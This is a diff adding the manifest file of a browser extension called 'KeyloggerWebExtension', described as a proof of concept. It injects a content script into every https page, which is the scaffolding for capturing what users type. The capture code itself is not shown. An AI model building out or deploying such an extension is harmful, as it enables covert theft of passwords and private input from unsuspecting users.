@@ -1,0 +1,15 @@
+{
+  "manifest_version": 3,
+  "name": "KeyloggerWebExtension",
+  "description": "This is a proof of concept and should not be used to cause harm to others.",
+  "version": "1.0",
+  "content_scripts": [
+	  {
+	    "js": ["scripts/content.js"],
+		"matches": [
+			"https://*/*"
+		]
+	  }
+  ]	  
+}
+
